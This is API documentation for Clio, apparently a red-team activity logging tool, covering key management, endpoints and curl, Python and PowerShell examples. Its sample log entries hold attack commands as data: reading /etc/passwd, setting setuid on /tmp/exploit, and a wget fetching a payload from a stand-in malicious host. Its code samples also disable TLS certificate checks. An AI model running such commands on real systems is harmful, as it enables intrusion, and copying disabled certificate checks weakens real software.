# API Documentation

Clio provides a REST API for programmatic log submission, allowing integration with external tools and automation of workflows. This guide covers API authentication, available endpoints, and usage examples.

## API Key Management

### Creating API Keys

API keys can only be created by administrators through the Clio web interface:

1. Log in as an administrator
2. Navigate to the "API Keys" section
3. Click "Create API Key"
4. Configure the key:
   - **Name**: A descriptive name for the key
   - **Description**: (Optional) Information about key usage
   - **Permissions**: Select appropriate permissions
   - **Expiration**: (Optional) Set an expiration date

The generated API key will be displayed only once. Make sure to copy and store it securely.

### API Key Format

API keys follow this format:
```
rtl_keyId_secretPart
```

- `rtl_` is the prefix identifying a Clio API key
- `keyId` is a unique identifier for the key (used for tracking and revocation)
- `secretPart` is the secure part of the key (never stored in plain text)

### API Key Permissions

Each API key can have one or more of the following permissions:

- **logs:write**: Submit new logs via API
- **logs:read**: Read existing logs via API (reserved for future use)
- **logs:admin**: Full admin privileges via API (reserved for future use)

## Authentication

All API requests must include the API key in the `X-API-Key` header:

```
X-API-Key: rtl_yourkey_abc123
```

## API Endpoints

### Status Check

Verify that your API key is working correctly:

```
GET /api/ingest/status
```

**Example Response:**
```json
{
  "status": "ok",
  "apiKey": {
    "name": "Integration Key",
    "keyId": "a1b2c3d4",
    "permissions": ["logs:write"]
  },
  "timestamp": "2025-03-06T14:30:45.123Z"
}
```

### Log Submission

Submit one or more logs:

```
POST /api/ingest/logs
```

**Request Format (Single Log):**
```json
{
  "internal_ip": "192.168.1.100",
  "external_ip": "203.0.113.1",
  "hostname": "victim-host",
  "domain": "example.org",
  "username": "jsmith",
  "command": "cat /etc/passwd",
  "notes": "Privilege escalation attempt",
  "filename": "passwd",
  "status": "ON_DISK"
}
```

**Request Format (Multiple Logs):**
```json
[
  {
    "internal_ip": "192.168.1.100",
    "hostname": "host-1",
    "command": "chmod +s /tmp/exploit"
  },
  {
    "external_ip": "198.51.100.1",
    "hostname": "host-2",
    "domain": "example.org",
    "command": "wget http://malicious.com/payload"
  }
]
```

**Response Format:**
```json
{
  "message": "Processed 2 logs: 2 successful, 0 failed",
  "results": [
    {
      "id": 1234,
      "success": true
    },
    {
      "id": 1235,
      "success": true
    }
  ]
}
```

## Field Descriptions

| Field | Description | Max Length | Required |
|-------|-------------|------------|----------|
| internal_ip | Internal IP address of the target system | 45 | No |
| external_ip | External/public IP address | 45 | No |
| hostname | System hostname | 75 | No |
| domain | Associated domain | 75 | No |
| username | User account name | 75 | No |
| command | Command executed on the system | 150 | No |
| notes | Additional context or observations | 254 | No |
| filename | Name of relevant files | 100 | No |
| status | File status (ON_DISK, IN_MEMORY, etc.) | 75 | No |
| hash_algorithm | Hash algorithm used (MD5, SHA1, etc.) | 20 | No |
| hash_value | File hash value | 128 | No |
| secrets | Credentials or tokens (automatically masked) | 150 | No |

## Error Responses

| Status Code | Description | Example |
|-------------|-------------|---------|
| 400 | Bad Request (invalid data) | `{"error": "Invalid log data"}` |
| 401 | Unauthorized (invalid API key) | `{"error": "Invalid API key"}` |
| 403 | Forbidden (insufficient permissions) | `{"error": "Insufficient permissions", "detail": "This API key does not have the required permission: logs:write"}` |
| 429 | Too Many Requests (rate limit exceeded) | `{"error": "Too many requests", "detail": "Rate limit exceeded. Try again later."}` |
| 500 | Server Error | `{"error": "Internal server error"}` |

## Rate Limits

To ensure system stability, API requests are rate-limited:

- **Log Submission**: 60 requests per minute (1 per second)
- **Maximum batch size**: 50 logs per request
- **Maximum request size**: 10MB

## Code Examples

### cURL Example

```bash
curl -k -X POST https://your-IP-or-Host/ingest/logs \
  -H "Content-Type: application/json" \
  -H "X-API-Key: rtl_yourkey_abc123" \
  -d '{
    "internal_ip": "192.168.1.100",
    "external_ip": "203.0.113.1",
    "hostname": "victim-host",
    "domain": "example.org",
    "username": "jsmith",
    "command": "cat /etc/passwd",
    "notes": "Privilege escalation attempt",
    "filename": "passwd",
    "status": "ON_DISK"
  }'
```

### Python Example

```python
import requests
import urllib3

# Disable SSL warnings for self-signed certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def send_log(api_key, log_data):
    url = "https://your-IP-or-Host/ingest/logs"
    headers = {
        "Content-Type": "application/json",
        "X-API-Key": api_key
    }
    
    response = requests.post(url, headers=headers, json=log_data, verify=False)
    response.raise_for_status()
    return response.json()

# Example usage
api_key = "rtl_yourkey_abc123"
log_data = {
    "internal_ip": "192.168.1.100",
    "hostname": "victim-host",
    "command": "cat /etc/passwd",
    "status": "ON_DISK"
}

result = send_log(api_key, log_data)
print(result)
```

### PowerShell Example

```powershell
# Disable SSL certificate validation for self-signed certs
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

$url = "https://your-IP-or-Host/ingest/logs"
$headers = @{
    "Content-Type" = "application/json"
    "X-API-Key" = "rtl_yourkey_abc123"
}
$payload = @{
    internal_ip = "192.168.1.100"
    external_ip = "203.0.113.1"
    hostname = "victim-host"
    domain = "example.org"
    username = "jsmith"
    command = "cat /etc/passwd"
    notes = "Privilege escalation attempt"
    filename = "passwd"
    status = "ON_DISK"
} | ConvertTo-Json

$response = Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $payload -ContentType "application/json"
$response | ConvertTo-Json
```

## Best Practices

1. **Secure your API keys** - Treat API keys like passwords. Don't hardcode them in scripts.
2. **Set expiration dates** - Periodically rotate API keys for better security.
3. **Use minimal permissions** - Give each key only the permissions it needs.
4. **Include relevant context** - Provide detailed information in log entries.
5. **Implement error handling** - Handle API errors gracefully in your code.
6. **Monitor usage** - Regularly check API key usage in the admin panel.